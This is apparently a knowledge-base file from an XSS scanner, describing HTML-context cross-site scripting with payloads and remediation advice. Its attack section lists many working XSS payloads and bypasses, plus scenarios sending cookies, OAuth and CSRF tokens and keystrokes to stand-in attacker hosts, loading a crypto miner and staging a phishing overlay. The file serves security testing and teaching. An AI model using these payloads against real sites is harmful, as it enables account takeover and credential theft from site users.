#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Modified
Telegram: https://t.me/easyprotech

Knowledge Base: HTML Content Context - Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in HTML Content",
    
    # Metadata for SIEM/Triage Integration
    "severity": "critical",
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "html", "reflected", "stored", "injection"],
    
    "description": """
User input is reflected directly into the HTML body without proper sanitization. This is the most 
straightforward and dangerous XSS vector, allowing injection of arbitrary HTML elements, scripts, 
and interactive content. It's the primary target for stored/persistent XSS attacks and can lead to 
complete account takeover, credential theft, and malware distribution.

VULNERABILITY CONTEXT:
When user-controlled data is inserted between HTML tags without encoding, attackers can inject 
their own HTML markup including script tags, event handlers, iframes, and other active content.
This is common in:
- Comment systems
- User profiles (bio, username display)
- Blog posts and articles
- Forum threads
- Chat messages
- Product reviews
- Wiki pages
- Email web clients
- CMS content
- Search result pages

SEVERITY: CRITICAL
This vulnerability consistently ranks in OWASP Top 10 and is the foundation for most XSS attacks.
""",

    "attack_vector": """
CLASSIC ATTACK VECTORS:

1. SCRIPT TAG INJECTION:
   <script>alert(document.cookie)</script>
   <script>fetch('//attacker.com/steal?c='+document.cookie)</script>
   <script src="//evil.com/xss.js"></script>
   
2. IMG TAG WITH ONERROR:
   <img src=x onerror=alert(1)>
   <img src=x onerror="fetch('//attacker.com?c='+btoa(document.cookie))">
   <img/src=x onerror=eval(atob('YWxlcnQoMSk='))>

3. SVG ONLOAD:
   <svg onload=alert(1)>
   <svg/onload=alert`1`>
   <svg><script>alert(1)</script></svg>
   <svg><animate onbegin=alert(1) attributeName=x dur=1s>

4. IFRAME INJECTION:
   <iframe src=javascript:alert(1)>
   <iframe srcdoc="<script>alert(1)</script>">
   <iframe src="data:text/html,<script>alert(1)</script>">

5. BODY/HTML EVENT HANDLERS:
   <body onload=alert(1)>
   <body onpageshow=alert(1)>
   <body onfocus=alert(1)>

6. INPUT/FORM AUTOFOCUS:
   <input onfocus=alert(1) autofocus>
   <select onfocus=alert(1) autofocus>
   <textarea onfocus=alert(1) autofocus>
   <keygen onfocus=alert(1) autofocus>

7. DETAILS/SUMMARY (HTML5):
   <details open ontoggle=alert(1)>
   <details><summary>Click</summary><script>alert(1)</script></details>

8. VIDEO/AUDIO TAGS:
   <video><source onerror=alert(1)>
   <audio src=x onerror=alert(1)>
   <video poster=javascript:alert(1)>

9. MARQUEE/BLINK:
   <marquee onstart=alert(1)>XSS</marquee>
   <marquee loop=1 width=0 onfinish=alert(1)>

10. OBJECT/EMBED:
    <object data="javascript:alert(1)">
    <embed src="javascript:alert(1)">
    <object data="data:text/html,<script>alert(1)</script>">

MODERN BYPASSES AND TECHNIQUES:

11. MUTATION XSS (mXSS):
    Payloads that look safe but become dangerous after HTML parsing:
    <noscript><p title="</noscript><img src=x onerror=alert(1)>">
    <form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>

12. DANGLING MARKUP INJECTION:
    Used for data exfiltration when XSS is partially filtered:
    <img src='//attacker.com/collect?
    (Captures all following HTML until next single quote)

13. HTML5 FORM HIJACKING:
    <form action="//attacker.com"><button>Click</button></form>
    <input form=x><form id=x action="//evil.com"><button>Submit</button></form>

14. POLYGLOT VECTORS:
    Works across multiple contexts (HTML, JS, etc):
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
    jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e

15. UNICODE/ENCODING BYPASSES:
    <script>\\u0061lert(1)</script>
    <script>\\x61lert(1)</script>
    <script>eval('\\x61lert(1)')</script>
    <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

16. NULL BYTE INJECTION:
    <script>alert(1)</script>%00
    <img src=x%00 onerror=alert(1)>

17. BREAKING OUT OF ATTRIBUTES:
    If input is in: <div data-text="USER_INPUT">
    Payload: "><script>alert(1)</script>
    Result: <div data-text=""><script>alert(1)</script>">

18. COMMENT BREAKOUT:
    <!-- USER_INPUT -->
    Payload: --><script>alert(1)</script><!--

19. CSS EXPRESSION (Legacy IE):
    <style>body{background:expression(alert(1))}</style>

20. BASE TAG HIJACKING:
    <base href="//attacker.com/">
    (Hijacks all relative URLs on page)

REAL-WORLD ATTACK SCENARIOS:

SESSION HIJACKING:
<script>
new Image().src='//attacker.com/steal?c='+document.cookie;
</script>

KEYLOGGER:
<script>
document.onkeypress=function(e){
  fetch('//attacker.com/log?k='+e.key);
}
</script>

PHISHING:
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <form action="//attacker.com/phish">
    <h2>Session Expired - Please Login</h2>
    <input name="user" placeholder="Username">
    <input name="pass" type="password" placeholder="Password">
    <button>Login</button>
  </form>
</div>

CRYPTOCURRENCY MINER:
<script src="//attacker.com/coinhive.js"></script>
<script>
var miner=new CoinHive.Anonymous('attacker-key');
miner.start();
</script>

DEFACEMENT:
<script>
document.body.innerHTML='<h1>Hacked by Attacker</h1>';
</script>

BROWSER EXPLOITATION:
<script src="//attacker.com/browser-exploit.js"></script>

OAUTH TOKEN THEFT:
<script>
var token=localStorage.getItem('oauth_token');
fetch('//attacker.com/steal?t='+token);
</script>

CSRF TOKEN EXFILTRATION:
<script>
var csrf=document.querySelector('[name=csrf_token]').value;
fetch('//attacker.com/csrf?t='+csrf);
</script>
""",

    "remediation": """
DEFENSE-IN-DEPTH STRATEGY:

1. OUTPUT ENCODING (PRIMARY DEFENSE):
   
   HTML Entity Encoding:
   Convert: < > & " '
   To:      &lt; &gt; &amp; &quot; &#x27;
   
   Python Example:
   import html
   safe_output = html.escape(user_input, quote=True)
   
   PHP Example:
   $safe_output = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
   
   JavaScript Example:
   function escapeHtml(text) {
     const map = {
       '&': '&amp;',
       '<': '&lt;',
       '>': '&gt;',
       '"': '&quot;',
       "'": '&#x27;'
     };
     return text.replace(/[&<>"']/g, m => map[m]);
   }

2. CONTENT SECURITY POLICY (CSP):
   
   Strict CSP (Recommended):
   Content-Security-Policy: 
     default-src 'self'; 
     script-src 'nonce-{random}' 'strict-dynamic'; 
     object-src 'none'; 
     base-uri 'none';
   
   Then in HTML:
   <script nonce="{random}">
     // Safe inline script
   </script>
   
   CSP with hashes:
   Content-Security-Policy: 
     script-src 'sha256-{hash-of-script}'

3. USE SAFE APIS:
   
   SAFE (Use these):
   - textContent
   - innerText
   - setAttribute()
   - createTextNode()
   
   DANGEROUS (Avoid):
   - innerHTML
   - outerHTML
   - document.write()
   - insertAdjacentHTML()
   
   Example:
   // BAD:
   element.innerHTML = userInput;
   
   // GOOD:
   element.textContent = userInput;

4. MODERN FRAMEWORK PROTECTION:
   
   React (Safe by default):
   function Component({ userInput }) {
     return <div>{userInput}</div>; // Auto-escaped
   }
   
   // DANGEROUS:
   <div dangerouslySetInnerHTML={{__html: userInput}} />
   
   Vue (Safe by default):
   <template>
     <div>{{ userInput }}</div> <!-- Auto-escaped -->
   </template>
   
   // DANGEROUS:
   <div v-html="userInput"></div>
   
   Angular (Safe by default):
   <div>{{ userInput }}</div> <!-- Auto-escaped -->
   
   // DANGEROUS:
   <div [innerHTML]="userInput"></div>

5. HTML SANITIZATION:
   
   When rich HTML is required, use battle-tested libraries:
   
   JavaScript (DOMPurify):
   import DOMPurify from 'dompurify';
   const clean = DOMPurify.sanitize(dirty);
   
   Python (Bleach):
   import bleach
   clean = bleach.clean(
     dirty,
     tags=['b', 'i', 'u', 'em', 'strong', 'a'],
     attributes={'a': ['href', 'title']},
     protocols=['http', 'https', 'mailto']
   )
   
   Java (OWASP Java HTML Sanitizer):
   PolicyFactory policy = new HtmlPolicyBuilder()
     .allowElements("b", "i", "u")
     .allowAttributes("href").onElements("a")
     .allowStandardUrlProtocols()
     .toFactory();
   String safeHTML = policy.sanitize(untrustedHTML);

6. TRUSTED TYPES API (Modern Browsers):
   
   Enforce at policy level:
   Content-Security-Policy: require-trusted-types-for 'script'
   
   JavaScript:
   const policy = trustedTypes.createPolicy('myPolicy', {
     createHTML: (string) => {
       // Sanitize here
       return DOMPurify.sanitize(string);
     }
   });
   
   element.innerHTML = policy.createHTML(userInput);

7. INPUT VALIDATION:
   
   Whitelist approach:
   - Define what is allowed
   - Reject everything else
   
   Example for username:
   const USERNAME_REGEX = /^[a-zA-Z0-9_-]{3,20}$/;
   if (!USERNAME_REGEX.test(username)) {
     throw new Error('Invalid username');
   }

8. HTTPONLY & SECURE COOKIES:
   
   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
   
   HttpOnly: Prevents JavaScript access to cookie
   Secure: Only sent over HTTPS
   SameSite: Prevents CSRF

9. X-XSS-PROTECTION HEADER:
   
   X-XSS-Protection: 1; mode=block
   
   Note: Deprecated in modern browsers that support CSP

10. X-CONTENT-TYPE-OPTIONS:
    
    X-Content-Type-Options: nosniff
    
    Prevents MIME-sniffing attacks

SECURITY CHECKLIST:

[ ] All user input is HTML entity encoded before output
[ ] CSP is implemented with nonce or hash
[ ] Using framework auto-escaping (not bypassed)
[ ] No innerHTML/document.write with user data
[ ] HTML sanitization library if rich content needed
[ ] HTTPOnly flag on all session cookies
[ ] Secure flag on cookies (HTTPS only)
[ ] SameSite attribute on cookies
[ ] Input validation with whitelist
[ ] Regular security testing (automated + manual)
[ ] Security code review for all user input handling
[ ] Trusted Types API enabled (if browser support available)
[ ] WAF as additional layer (not primary defense)
[ ] Security headers configured (CSP, X-Content-Type-Options)
[ ] Developer security training completed

TESTING PAYLOADS:

Basic detection:
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Filter bypass:
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>

Encoding:
&lt;script&gt;alert(1)&lt;/script&gt;
\\x3cscript\\x3ealert(1)\\x3c/script\\x3e

OWASP REFERENCES:
- OWASP Top 10: A03:2021 - Injection
- CWE-79: Improper Neutralization of Input During Web Page Generation
- OWASP XSS Prevention Cheat Sheet
- OWASP Testing Guide: Testing for Reflected XSS
- OWASP Testing Guide: Testing for Stored XSS
"""
}
